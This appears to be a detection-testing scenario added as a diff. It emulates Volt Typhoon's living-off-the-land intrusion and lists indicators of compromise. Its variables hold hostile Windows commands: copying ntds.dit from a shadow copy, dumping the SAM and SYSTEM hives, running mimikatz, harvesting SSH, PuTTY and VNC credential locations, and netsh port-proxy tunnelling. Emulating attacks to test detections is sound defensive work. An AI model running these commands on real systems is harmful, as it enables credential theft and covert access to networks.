@@ -1,0 +1,414 @@
+title "Volt Typhoon Threat Group Campaign"
+
+reference "https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/"
+reference "https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF"
+reference "https://www.microsoft.com/en-us/security/blog/2018/09/27/out-of-sight-but-not-invisible-defeating-fileless-malware-with-behavior-monitoring-amsi-and-next-gen-av/"
+reference "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a"
+reference "https://research.splunk.com/stories/volt_typhoon/"
+
+description "Volt Typhoon Exfiltration: Its stealthy and targeted malicious activity focused on post-compromise credential access and network system discovery aimed at critical infrastructure organizations. The attack is carried out by Volt Typhoon, a state-sponsored actor based in China that typically focuses on espionage and information gathering. To achieve their objective, the threat actor puts strong emphasis on stealth in this campaign, relying almost exclusively on living-off-the-land techniques and hands-on-keyboard activity. They have also been observed using custom versions of open-source tools to establish a command and control (C2) channel over proxy to further stay under the radar. Relying almost exclusively on living-off-the-land techniques and hands-on-keyboard activity"
+
+author "Detecteam"
+status "development"
+
+tag "threat-group=volt typhoon"
+tag "category=infostealer"
+##tactic##
+tag "mitre-tactic=Discovery"
+tag "mitre-tactic=Lateral Movement"
+tag "mitre-tactic=Collection"
+tag "mitre-tactic=Command and Control"
+tag "mitre-tactic=Exfiltration"
+
+
+#####################
+tag "mitre-attack=T1012"
+tag "mitre-attack=T1016"
+tag "mitre-attack=T1033"
+tag "mitre-attack=T1049"
+tag "mitre-attack=T1059.001"
+tag "mitre-attack=T1069.001"
+tag "mitre-attack=T1082"
+tag "mitre-attack=T1083"
+tag "mitre-attack=T1518"
+
+# Context from MAR-10448362.c1.v1.CLEAR_stix2.json
+
+section start " Start"  {}
+
+section global_variables "__hidden__" {
+    $computer.name = "beachhead"
+    $user.name = "johndoe"
+    $cidr_range = "192.168.1.0/24"
+    $server.name = "server"
+    $server.ip = "192.168.1.254"
+    $admin_id = "administrator"
+    $admin_password = random.string(8)
+
+    $ports_used = [
+        "8080",
+        "8443",
+        "8043",
+        "8000",
+        "10443"
+    ]
+
+    $common_execs_used = [
+        "cisco_up.exe",
+        "cl64.exe",
+        "vm3dservice.exe",
+        "watchdogd.exe",
+        "Win.exe",
+        "WmiPreSV.exe",
+        "WmiPrvSE.exe"
+    ]
+
+    $folders_used = [
+        """C:\Windows\Temp\pro""",
+        """C:\Windows\Temp\tmp""",
+        """C:\Windows\Temp\McAfee_Logs""",
+        """C:\Users\Public\Appfile""",
+        """C:\Perflogs"""
+    ]
+
+    $command2gather_data = """cmd.exe /C "wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename""""
+
+    $ad_info_file = """%SystemRoot%\NTDS\ntds.dit"""
+
+    $randomShadow = random.string(16)
+    $create_shadow_volume = """cmd /c vssadmin create shadow /for=C: > C:\Windows\Temp\${randomShadow}.tmp"""
+    $command2CopyNTDS_dit = """cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\${randomShadow}.tmp"""
+
+    $randomFolder = random($folders_used)
+    $filesCreates = [
+        """${randomFolder}\Active Directory\ntds.dit""",
+        """${randomFolder}\Active Directory\ntds.jfm""",
+        """${randomFolder}\registry\SECURITY""",
+        """${randomFolder}\registry\SYSTEM"""
+    ]
+
+    $last_range = random.int(1, 253)
+    $randomip = ip.cidr($cidr_range, $last_range)
+    $randomPortOne = random($ports_used)
+    $randomPortTwo = random($ports_used)
+
+    
+    $enable_port_forwarding_commands = [
+        """cmd.exe /c "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=${randomip} connectport=${randomPortOne} protocol=tcp"""",
+        """cmd.exe /c "netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=${randomPortTwo} connectaddress=${randomip}""""
+    ]
+    
+    $registry_key_created = """HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp"""
+
+    $pwc_get_success_logon = "Get-EventLog security -instanceid 4624" # to identify successful logons to the host
+    $pwc_get_failed_logons = "Get-EventLog security -instanceid 4625" # to identify failed logons to the host
+    
+    # Several  failed logon (Event ID 4625)
+    # One or more successful logons (Event ID 4624) 
+    # Force Brute = Several  failed logon (Event ID 4625) same account followed by a successful logon Event ID 4624 for the same account
+
+    $redirecting_output = """cmd.exe /Q /c dir 1>\\127.0.0.1\ADMIN$\__1684956600.123456 2>&1"""
+    $randomZone = random.string(16)
+    $randomTempFileName = random.string(16)
+    $randomTimeStamp = time.epoch() # "1685449938"
+    $randomData = random.string(64)
+    $check_env_commands = [
+        """arp -a""",
+        """curl www.ip-api.com""",
+        """dnscmd . /enumrecords /zone ${randomZone}""",
+        """dnscmd . /enumzones""",
+        """dnscmd /enumrecords ${randomZone} . /additional""",
+        """ipconfig /all""",
+        """ldifde.exe -f c:\windows\temp\${randomTempFileName}.txt -p subtree""",
+        """net localgroup administrators""",
+        """net group /dom""",
+        """net group "Domain Admins" /dom""",
+        """netsh interface firewall show all""",
+        """netsh interface portproxy show all""",
+        """netsh interface portproxy show v4tov4""",
+        """netsh firewall show all""",
+        """netsh portproxy show v4tov4""",
+        """netstat -ano""",
+        """reg query hklm\software\ """,
+        """systeminfo""",
+        """tasklist /v""",
+        """whoami""",
+        """wmic volume list brief""",
+        """wmic service brief""",
+        """wmic product list brief""",
+        """wmic baseboard list full""",
+        """wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='${randomTimeStamp}']] and EventData[Data='${randomData}']]"""
+    ]
+    # The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment
+    $randomUser = $user.name
+    $randomKeySubPath = random.string(16)
+    $credential_theft_commands = [
+        """dir C:\Users\${randomUser}\.ssh\known_hosts""",
+        """dir C:\users\${randomUser}\appdata\roaming\Mozilla\firefox\profiles""",
+        """mimikatz.exe""",
+        """reg query hklm\software\OpenSSH""",
+        """reg query hklm\software\OpenSSH\Agent""",
+        """reg query hklm\software\realvnc""",
+        """reg query hklm\software\realvnc\vncserver""",
+        """reg query hklm\software\realvnc\Allusers""",
+        """reg query hklm\software\realvnc\Allusers\vncserver""",
+        """reg query hkcu\software\${randomKeySubPath}\putty\session""",
+        """reg save hklm\sam ss.dat""",
+        """reg save hklm\system sy.dat"""
+    ]
+    $randomCryptPassword = random.string(16)
+    $random7zFile = random.string(16)
+    $randomip = ip.cidr($cidr_range, $last_range)
+    $randomUsrPWD = random.string(16)
+    $randomSrvName = ip.tohostname($randomip)
+    $randomTimeStamp = time.epoch() # "1685449938"
+    $randomBatFile = random.string(16)
+    $randomRaRFile = random.string(16)
+    $randomFolder2RaR = random.string(16)
+    $randomHostName = random.string(16)
+
+    $additional_commands = [
+        """7z.exe a -p ${randomCryptPassword} c:\windows\temp\${random7zFile}.7z""",
+        """C:\Windows\system32\pcwrun.exe""",
+        """C:\Users\Administrator\Desktop\Win.exe""",
+        """C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log""",
+        """C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\tmp.log""",
+        """"cmd.exe" /c dir \\127.0.0.1\C$ /od""",
+        """"cmd.exe" /c ping –a –n 1 ${randomip}""",
+        """"cmd.exe" /c wmic /user:${randomUser} /password:${randomUsrPWD} process call create "net stop \\"${randomSrvName}\\" > C:\Windows\Temp\tmp.log" """,
+        """cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__${randomTimeStamp} 2>&1""",
+        """net use \\127.0.0.1\IPC$ /y /d""",
+        """powershell start-process -filepath""",
+        """c:\windows\temp\${randomBatFile}.bat -windowstyle Hidden""",
+        """rar.exe a –p${randomCryptPassword} c:\Windows\temp\${randomRaRFile} D:\${randomFolder2RaR}\ """,
+        """wmic /node:${randomHostName} /user:${randomUser} /password:${randomUsrPWD}""",
+        """cmd /c whoami""",
+        """xcopy C:\windows\temp\hp d:\${randomFolder2RaR}"""
+    ]
+
+    $event_platform = "Win"
+}
+# START DETECTION
+
+# SEC 1: Initial Access
+tactic "Initial Access"
+
+section initial_access "Initial access" {
+
+    step first_gathering_action { 
+        $process.command_line = $command2gather_data
+        action Process.Start
+    }
+    sleep 2
+    step access_ad_ntds_dit {
+        $file.path = $ad_info_file
+        action File.Open
+    }
+    sleep 3
+    loop $filesCreates as $thefile { 
+        step files_created {
+            $file.path = $thefile
+            action File.Create
+        }
+    }
+    sleep 4
+    step create_shadow_volume {
+        $process.command_line = $create_shadow_volume
+        action Process.Start
+    }
+    sleep 5
+    step action_copy_ntds_dit {
+        $process.command_line = $command2CopyNTDS_dit
+        action Process.Start
+    }
+    sleep 6
+    loop $enable_port_forwarding_commands as $forward_command {
+        step forwarding_proxy_connections {
+            $process.command_line = $forward_command
+            action Process.Start
+        }
+        sleep 8
+        step proxy_command_creates_reg_key {
+            $randomHKEYName = random.string(16)
+            $process.name = "reg.exe"
+            
+            $registry.hive = "HKLM"
+            $registry.path = "${registry.hive}\\${registry_key_created}\\${randomHKEYName}"
+            $registry.key = $registry_key_created
+            $registry.value = $randomHKEYName
+            $registry.data = $randomHKEYName
+            action Windows.Registry.Create
+        }
+    }
+    sleep 7
+    # TCP Ports open after proxy connections: 9999 and 50100
+    step outbound_port_listen_one {
+        $network.protocol = "tcp"
+        $network.direction = "inbound"
+        $source.port = "9999"
+        run TCPHandshake
+    }
+    sleep 9
+    step outbound_port_listen_two {
+        $network.protocol = "tcp"
+        $network.direction = "inbound"
+        $source.port = "50100"
+        run TCPHandshake
+    }
+    sleep 1
+}
+
+section checkin_logon "Identify successful/failed logons" {
+        # The actor has used the following PowerShell command to identify successful/failed logons to the host:
+    # Checking Several failed logons 
+    $logon_attempts = random.int(5,30)
+    loop $logon_attempts {
+        step check_failed_logons {
+            # Power Shell Command: $pwc_get_failed_logons
+            $process.command_line = """C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe --command " ${pwc_get_failed_logons} " """
+            action Process.Start
+        }
+    }
+    sleep 2
+    $success_logon = random.int(1,2)
+    # Checking One or two success logons
+    loop $success_logon {
+        step check_success_logons {
+            # Power Shell Command: $pwc_get_success_logon
+            $process.command_line = """C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe --command " ${pwc_get_success_logon} " """
+            action Process.Start
+        }
+    }
+    sleep 3
+
+}
+    
+
+
+
+# SEC 2: Post-compromise activity: living-off-the-land commands
+section post_compromise_activity  "Post-compromise activity" {
+
+    # Enumeration of the environment
+    loop $check_env_commands as $env_command { 
+        step disconver_env_commands {
+            $process.command_line = $env_command
+            action Process.Start
+        }
+    }
+    sleep 4
+
+    # Additional credential theft: The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment
+    loop $credential_theft_commands as $theft_command {
+        step additional_theft_cmd {
+            $process.command_line = $theft_command
+            action Process.Start
+        }
+    }
+    sleep 5
+    # Additional commands 
+    loop $additional_commands as $extra_command {
+        step additional_extra_cmd {
+            $process.command_line = $extra_command
+            action Process.Start
+        }
+    }
+    sleep 6
+    # powershell start-process -filepath c:\windows\temp\*.exe - windowstyle hidden
+    loop $common_execs_used as $pws_exec {
+        step pws_exec_used {
+            $exec_folder = random($folders_used)
+            $process.command_line = "powershell start-process -filepath ${exec_folder}\${pws_exec} - windowstyle hidden"
+            action Process.Start
+        }
+    }
+    sleep 7
+}
+
+#################################
+#    Indicators Of Compromise   #
+#################################
+
+section ioc "__hidden__" {
+    # including subdirectories
+    $file_paths = [
+        """C:\Users\Public\Appfile""",
+        """C:\Perflogs""",
+        """C:\Windows\Temp"""
+    ]
+    
+    # The file names the actor has previously used for such things as malware, scripts, and tools include
+    $file_names = [
+        "backup.bat",
+        "cl64.exe",
+        "update.bat",
+        "Win.exe",
+        "billagent.exe",
+        "nc.exe",
+        "update.exe",
+        "WmiPrvSE.exe",
+        "billaudit.exe",
+        "rar.exe",
+        "vm3dservice.exe",
+        "WmiPreSV.exe",
+        "cisco_up.exe",
+        "SMSvcService.exe",
+        "watchdogd.exe"
+    ]
+
+    $ramdom_file_name_format = """C:\Windows\[a-zA-Z]{8}.exe"""
+
+    # File hashes
+    $file_hashes = [
+        "f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd",
+        "ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31",
+        "d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca",
+        "472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d",
+        "66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7",
+        "3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71",
+        "41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597",
+        "c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99",
+        "3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f",
+        "fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15",
+        "ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484"
+    ]
+
+    $extra_tools4copy = [
+        "Secretsdump.py",
+        "Invoke-NinjaCopy", # PowerShell
+        "DSInternals", # PowerShell
+        "FgDump",
+        "Metasploit"
+    ]
+
+    # User-Agent: In some cases, the following user-agent string (including the extra spacing) was identified performing reconnaissance activities by this actor:
+    $user_agents = [
+        """Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)""",
+        """Gecko/20100101 Firefox/68.0"""
+    ]
+
+    # Volt Typhoon custom FRP executable (SHA-256):
+    $exec_hashes = [
+        "baeffeb5fdef2f42a752c65c2d2a52e84fb57efc906d981f89dd518c314e231c",
+        "b4f7c5e3f14fb57be8b5f020377b993618b6e3532a4e1eb1eae9976d4130cc74",
+        "4b0c4170601d6e922cf23b1caf096bba2fade3dfcf92f0ab895a5f0b9a310349",
+        "c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d",
+        "d6ab36cb58c6c8c3527e788fc9239d8dcc97468b6999cf9ccd8a815c8b4a80af",
+        "9dd101caee49c692e5df193b236f8d52a07a2030eed9bd858ed3aaccb406401a",
+        "450437d49a7e5530c6fb04df2e56c3ab1553ada3712fab02bd1eeb1f1adbc267",
+        "93ce3b6d2a18829c0212542751b309dacbdc8c1d950611efe2319aa715f3a066",
+        "7939f67375e6b14dfa45ec70356e91823d12f28bbd84278992b99e0d2c12ace5",
+        "389a497f27e1dd7484325e8e02bbdf656d53d5cf2601514e9b8d8974befddf61",
+        "c4b185dbca490a7f93bc96eefb9a597684fdf532d5a04aa4d9b4d4b1552c283b",
+        "e453e6efc5a002709057d8648dbe9998a49b9a12291dee390bb61c98a58b6e95",
+        "6036390a2c81301a23c9452288e39cb34e577483d121711b6ba6230b29a3c9ff",
+        "cd69e8a25a07318b153e01bba74a1ae60f8fc28eb3d56078f448461400baa984",
+        "17506c2246551d401c43726bdaec800f8d41595d01311cf38a19140ad32da2f4",
+        "8fa3e8fdbaa6ab5a9c44720de4514f19182adc0c9c6001c19cf159b79c0ae9c2",
+        "d17317e1d5716b09cee904b8463a203dc6900d78ee2053276cc948e4f41c8295",
+        "472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d",
+        "3e9fc13fab3f8d8120bd01604ee50ff65a40121955a4150a6d2c007d34807642"
+    ]
+}
+section end " end"  {}
+
